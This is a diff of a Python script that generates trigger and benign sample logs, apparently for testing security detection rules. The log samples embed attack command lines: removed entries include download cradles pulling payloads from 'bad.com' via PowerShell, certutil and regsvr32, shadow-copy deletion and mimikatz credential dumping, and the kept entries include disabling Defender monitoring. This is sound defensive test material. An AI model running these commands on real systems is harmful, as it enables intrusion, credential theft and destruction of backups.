@@ -105,105 +105,17 @@ log_definitions = {
         "trigger": 'type=SYSCALL msg=audit(1779953406.123:465): path=/etc/crontab perm=w\n',
         "benign": 'type=SYSCALL msg=audit(1779953406.123:465): path=/var/spool/cron/crontabs/subhash perm=w\n'
     },
-    "de-ae-02/powershell-encoded-command": {
-        "trigger": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"PowerShell.EXE","commandLine":"powershell.exe -enc ZWNobyBoYWNrZWQ="}}}\n',
-        "benign": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"PowerShell.EXE","commandLine":"powershell.exe -NoProfile"}}}\n'
+    "de-ae-04/sysmon-event-log-cleared": {
+        "trigger": '{"win":{"system":{"eventID":"104","channel":"Microsoft-Windows-Sysmon/Operational"}}}',
+        "benign": '{"win":{"system":{"eventID":"105","channel":"Microsoft-Windows-Sysmon/Operational"}}}'
     },
-    "de-ae-02/powershell-download-cradle": {
-        "trigger": '{"win":{"system":{"eventID":"4104"},"eventdata":{"scriptBlockText":"IEX (New-Object Net.WebClient).DownloadString(\'http://bad.com/a.ps1\')"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"4104"},"eventdata":{"scriptBlockText":"Get-Process | Sort-Object CPU"}}}\n'
+    "de-ae-04/windows-defender-tampering": {
+        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"}}}',
+        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Get-Process"}}}'
     },
-    "de-cm-09/schtasks-creation": {
-        "trigger": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"schtasks.exe","commandLine":"schtasks /create /tn \\"malicious\\" /tr \\"cmd.exe\\""}}}\n',
-        "benign": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"schtasks.exe","commandLine":"schtasks /query"}}}\n'
-    },
-    "de-cm-09/registry-run-key": {
-        "trigger": '{"win":{"system":{"eventID":"13"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\malware"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"13"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer"}}}\n'
-    },
-    "de-ae-02/volume-shadow-copy-deleted": {
-        "trigger": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"vssadmin.exe","commandLine":"vssadmin delete shadows /all /quiet"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"vssadmin.exe","commandLine":"vssadmin list shadows"}}}\n'
-    },
-    "pr-aa-01/new-local-admin": {
-        "trigger": '{"win":{"system":{"eventID":"4732"},"eventdata":{"targetUserName":"Administrators"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"4732"},"eventdata":{"targetUserName":"Users"}}}\n'
-    },
-    "pr-aa-05/rdp-enabled": {
-        "trigger": '{"win":{"system":{"eventID":"13"},"eventdata":{"targetObject":"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\\fDenyTSConnections"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"13"},"eventdata":{"targetObject":"HKLM\\\\Software\\\\Microsoft\\\\NotRDP"}}}\n'
-    },
-    "de-cm-09/wmi-event-subscription": {
-        "trigger": '{"win":{"system":{"eventID":"19"},"eventdata":{"operation":"Created","eventType":"WmiFilter","query":"__EventFilter"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"19"},"eventdata":{"operation":"Deleted","eventType":"WmiFilter","query":"SELECT *"}}}\n'
-    },
-    "de-ae-02/lsass-memory-access": {
-        "trigger": '{"win":{"system":{"eventID":"10"},"eventdata":{"targetImage":"C:\\\\Windows\\\\system32\\\\lsass.exe","grantedAccess":"0x1010"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"10"},"eventdata":{"targetImage":"C:\\\\Windows\\\\system32\\\\lsass.exe","grantedAccess":"0x400"}}}\n'
-    },
-    "de-ae-02/mimikatz-indicators": {
-        "trigger": '{"win":{"system":{"eventID":"1"},"eventdata":{"commandLine":"mimikatz.exe privilege::debug sekurlsa::logonpasswords"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"1"},"eventdata":{"commandLine":"ping.exe 8.8.8.8"}}}\n'
-    },
-    "de-ae-02/pass-the-hash": {
-        "trigger": '{"win":{"system":{"eventID":"4624"},"eventdata":{"logonType":"9","logonProcessName":"seclogo","authenticationPackageName":"Negotiate"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"4624"},"eventdata":{"logonType":"3","logonProcessName":"NtLmSsp","authenticationPackageName":"NTLM"}}}\n'
-    },
-    "de-ae-02/dcsync-attack": {
-        "trigger": '{"win":{"system":{"eventID":"4662"},"eventdata":{"properties":"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2","accessMask":"0x100"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"4662"},"eventdata":{"properties":"some-other-guid","accessMask":"0x10"}}}\n'
-    },
-    "de-ae-02/kerberoasting": {
-        "trigger": '{"win":{"system":{"eventID":"4769"},"eventdata":{"ticketOptions":"0x40810000","ticketEncryptionType":"0x17"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"4769"},"eventdata":{"ticketOptions":"0x40810000","ticketEncryptionType":"0x12"}}}\n'
-    },
-    "de-ae-02/multiple-account-lockouts": {
-        "trigger": '{"win":{"system":{"eventID":"4740"},"eventdata":{"targetUserName":"user1"}}}\n'
-                   '{"win":{"system":{"eventID":"4740"},"eventdata":{"targetUserName":"user2"}}}\n'
-                   '{"win":{"system":{"eventID":"4740"},"eventdata":{"targetUserName":"user3"}}}\n'
-                   '{"win":{"system":{"eventID":"4740"},"eventdata":{"targetUserName":"user4"}}}\n'
-                   '{"win":{"system":{"eventID":"4740"},"eventdata":{"targetUserName":"user5"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"4740"},"eventdata":{"targetUserName":"user1"}}}\n'
-    },
-    "pr-aa-05/linux-passwd-non-root": {
-        "trigger": 'type=SYSCALL msg=audit(1779953407.123:466): path=/etc/shadow uid=1000 exe="/bin/cat"\n',
-        "benign": 'type=SYSCALL msg=audit(1779953407.123:466): path=/etc/shadow uid=0 exe="/usr/bin/passwd"\n'
-    },
-    "de-ae-02/reverse-shell": {
-        "trigger": 'type=SYSCALL msg=audit(1779953408.123:467): exe="/bin/bash" comm="bash" a1="-i"\n',
-        "benign": 'type=SYSCALL msg=audit(1779953408.123:467): exe="/bin/bash" comm="bash" a1="-c"\n'
-    },
-    "de-ae-02/base64-encoded-command": {
-        "trigger": 'type=SYSCALL msg=audit(1779953409.123:468): exe="/bin/base64" comm="base64" a1="-d" a2="aGFja2VkYnliYXNlNjRzdHJpbmd0aGF0aXN2ZXJ5bG9uZ2FuZHN1c3BpY2lvdXNsb29raW5n="\n',
-        "benign": 'type=SYSCALL msg=audit(1779953409.123:468): exe="/bin/echo" comm="echo" a1="hello"\n'
-    },
-    "de-cm-01/dns-tunneling": {
-        "trigger": '{"win":{"system":{"eventID":"22"},"eventdata":{"queryName":"a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0.com"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"22"},"eventdata":{"queryName":"google.com"}}}\n'
-    },
-    "de-cm-01/tor-exit-node": {
-        "trigger": 'Dec 10 14:40:00 firewall kernel: dstip="known_tor_node"\n',
-        "benign": 'Dec 10 14:40:00 proxy squid[123]: 12345.678 100 192.168.1.100 TCP_MISS/200 456 GET http://good.com - DIRECT/1.1.1.1 text/html\n'
-    },
-    "de-ae-02/beaconing": {
-        "trigger": ('{"win":{"system":{"eventID":"3"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"1.2.3.4"}}}\n' * 20),
-        "benign": '{"win":{"system":{"eventID":"3"},"eventdata":{"destinationIsIpv6":"false","destinationIp":"1.2.3.4"}}}\n'
-    },
-    "de-ae-02/certutil-download": {
-        "trigger": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"certutil.exe","commandLine":"certutil -urlcache -split -f http://bad.com/payload.exe payload.exe"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"certutil.exe","commandLine":"certutil -hashfile file.txt"}}}\n'
-    },
-    "de-ae-02/regsvr32-remote-script": {
-        "trigger": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"regsvr32.exe","commandLine":"regsvr32 /s /n /u /i:http://bad.com/payload.sct scrobj.dll"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"1"},"eventdata":{"originalFileName":"regsvr32.exe","commandLine":"regsvr32 /u mydll.dll"}}}\n'
-    },
-    "gv-po-01/admin-after-hours": {
-        "trigger": '{"win":{"system":{"eventID":"4624"},"eventdata":{"targetUserName":"Administrator"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"4624"},"eventdata":{"targetUserName":"user"}}}\n'
-    },
-    "rc-rp-01/backup-failure": {
-        "trigger": '{"win":{"system":{"eventID":"1002"},"eventdata":{"message":"veeam backup failed to complete due to fatal error"}}}\n',
-        "benign": '{"win":{"system":{"eventID":"1002"},"eventdata":{"message":"veeam backup completed successfully"}}}\n'
+    "de-ae-04/execution-from-recycle-bin": {
+        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\$Recycle.bin\\\\malware.exe"}}}',
+        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\Windows\\\\System32\\\\cmd.exe"}}}'
     }
 }
 
@@ -221,73 +133,3 @@ for rel_path, logs in log_definitions.items():
         f.write(logs["benign"])
 
 print("Successfully generated all sample log files!")
-    # Batch 6 Additions
-    ,"de-ae-04/sysmon-event-log-cleared": {
-        "trigger": '{"win":{"system":{"eventID":"104","channel":"Microsoft-Windows-Sysmon/Operational"}}}',
-        "benign": '{"win":{"system":{"eventID":"105","channel":"Microsoft-Windows-Sysmon/Operational"}}}'
-    },
-    "de-ae-04/windows-defender-tampering": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Get-Process"}}}'
-    },
-    "de-ae-04/execution-from-recycle-bin": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\$Recycle.bin\\\\malware.exe"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\Windows\\\\System32\\\\cmd.exe"}}}'
-    }
-
-    # Batch 6 Additions
-    ,"de-ae-04/sysmon-event-log-cleared": {
-        "trigger": '{"win":{"system":{"eventID":"104","channel":"Microsoft-Windows-Sysmon/Operational"}}}',
-        "benign": '{"win":{"system":{"eventID":"105","channel":"Microsoft-Windows-Sysmon/Operational"}}}'
-    },
-    "de-ae-04/windows-defender-tampering": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Get-Process"}}}'
-    },
-    "de-ae-04/execution-from-recycle-bin": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\$Recycle.bin\\\\malware.exe"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\Windows\\\\System32\\\\cmd.exe"}}}'
-    }
-
-    # Batch 6 Additions
-    ,"de-ae-04/sysmon-event-log-cleared": {
-        "trigger": '{"win":{"system":{"eventID":"104","channel":"Microsoft-Windows-Sysmon/Operational"}}}',
-        "benign": '{"win":{"system":{"eventID":"105","channel":"Microsoft-Windows-Sysmon/Operational"}}}'
-    },
-    "de-ae-04/windows-defender-tampering": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Get-Process"}}}'
-    },
-    "de-ae-04/execution-from-recycle-bin": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\$Recycle.bin\\\\malware.exe"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\Windows\\\\System32\\\\cmd.exe"}}}'
-    }
-
-    # Batch 6 Additions
-    ,"de-ae-04/sysmon-event-log-cleared": {
-        "trigger": '{"win":{"system":{"eventID":"104","channel":"Microsoft-Windows-Sysmon/Operational"}}}',
-        "benign": '{"win":{"system":{"eventID":"105","channel":"Microsoft-Windows-Sysmon/Operational"}}}'
-    },
-    "de-ae-04/windows-defender-tampering": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Get-Process"}}}'
-    },
-    "de-ae-04/execution-from-recycle-bin": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\$Recycle.bin\\\\malware.exe"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\Windows\\\\System32\\\\cmd.exe"}}}'
-    }
-
-    # Batch 6 Additions
-    ,"de-ae-04/sysmon-event-log-cleared": {
-        "trigger": '{"win":{"system":{"eventID":"104","channel":"Microsoft-Windows-Sysmon/Operational"}}}',
-        "benign": '{"win":{"system":{"eventID":"105","channel":"Microsoft-Windows-Sysmon/Operational"}}}'
-    },
-    "de-ae-04/windows-defender-tampering": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"powershell.exe Get-Process"}}}'
-    },
-    "de-ae-04/execution-from-recycle-bin": {
-        "trigger": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\$Recycle.bin\\\\malware.exe"}}}',
-        "benign": '{"win":{"system":{"eventID":"1"}, "eventdata":{"commandLine":"C:\\\\Windows\\\\System32\\\\cmd.exe"}}}'
-    }
-}
